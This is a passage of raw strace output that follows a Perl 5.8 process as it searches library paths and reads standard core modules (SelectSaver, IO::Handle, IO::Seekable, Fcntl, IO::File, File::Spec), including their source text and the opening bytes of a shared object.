undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
7695  07:19:58.079484 read(8, "", 4096) = 0
7695  07:19:58.079500 close(8)          = 0
7695  07:19:58.079576 stat64("/etc/perl/SelectSaver.pmc",  <unfinished ...>
7693  07:19:58.079596 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.079618 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7693  07:19:58.079632 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.079643 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7693  07:19:58.079655 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
7695  07:19:58.079668 <... stat64 resumed> 0xbffa084c) = -1 ENOENT (No such file or directory)
7693  07:19:58.079677 waitpid(-1,  <unfinished ...>
7695  07:19:58.079708 stat64("/etc/perl/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079723 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079736 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079750 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079767 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079781 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079793 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079806 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079818 stat64("/usr/share/perl5/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079831 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079843 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079857 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079870 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
7695  07:19:58.079891 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.079905 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.079916 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.079935 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
7695  07:19:58.080143 brk(0x81d6000)    = 0x81d6000
7695  07:19:58.080187 read(8, "", 4096) = 0
7695  07:19:58.080199 close(8)          = 0
7695  07:19:58.080680 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
7695  07:19:58.089725 read(6, "", 4096) = 0
7695  07:19:58.089742 close(6)          = 0
7695  07:19:58.089781 stat64("/etc/perl/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089796 stat64("/etc/perl/IO/Seekable.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.089810 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089823 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.089837 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089850 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.089863 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089875 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.089891 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089903 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.089916 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.089929 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
7695  07:19:58.089984 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.090047 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.090073 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.090107 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
7695  07:19:58.090256 stat64("/etc/perl/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090271 stat64("/etc/perl/Fcntl.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090284 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090296 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090309 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090322 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090335 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090347 stat64("/usr/lib/perl5/Fcntl.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090359 stat64("/usr/share/perl5/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090371 stat64("/usr/share/perl5/Fcntl.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090383 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.090395 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
7695  07:19:58.090416 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.090430 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.090440 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.090461 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
7695  07:19:58.090958 brk(0x81f7000)    = 0x81f7000
7695  07:19:58.091212 read(8, "", 4096) = 0
7695  07:19:58.091227 close(8)          = 0
7695  07:19:58.091300 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7695  07:19:58.091323 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7695  07:19:58.091350 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
7695  07:19:58.091364 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
7695  07:19:58.091454 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7695  07:19:58.091472 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da8000
7695  07:19:58.091486 mmap2(0xb7dab000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dab000
7695  07:19:58.091501 close(8)          = 0
7695  07:19:58.092062 read(6, "", 4096) = 0
7695  07:19:58.092097 close(6)          = 0
7695  07:19:58.092130 stat64("/etc/perl/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092181 stat64("/etc/perl/IO/File.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.092228 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092258 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.092304 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092336 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.092390 stat64("/usr/lib/perl5/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092402 stat64("/usr/lib/perl5/IO/File.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.092434 stat64("/usr/share/perl5/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092463 stat64("/usr/share/perl5/IO/File.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.092542 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.092588 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
7695  07:19:58.092642 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.092685 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.092732 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.092778 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
7695  07:19:58.093120 stat64("/etc/perl/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093137 stat64("/etc/perl/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093151 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093163 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093177 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093189 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093203 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093215 stat64("/usr/lib/perl5/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093227 stat64("/usr/share/perl5/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093239 stat64("/usr/share/perl5/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093256 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093269 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093282 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093295 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
7695  07:19:58.093316 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.093330 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.093341 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.093359 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
7695  07:19:58.093432 stat64("/etc/perl/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093445 stat64("/etc/perl/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.093458 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093470 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.093483 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093496 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.093544 stat64("/usr/lib/perl5/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093572 stat64("/usr/lib/perl5/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
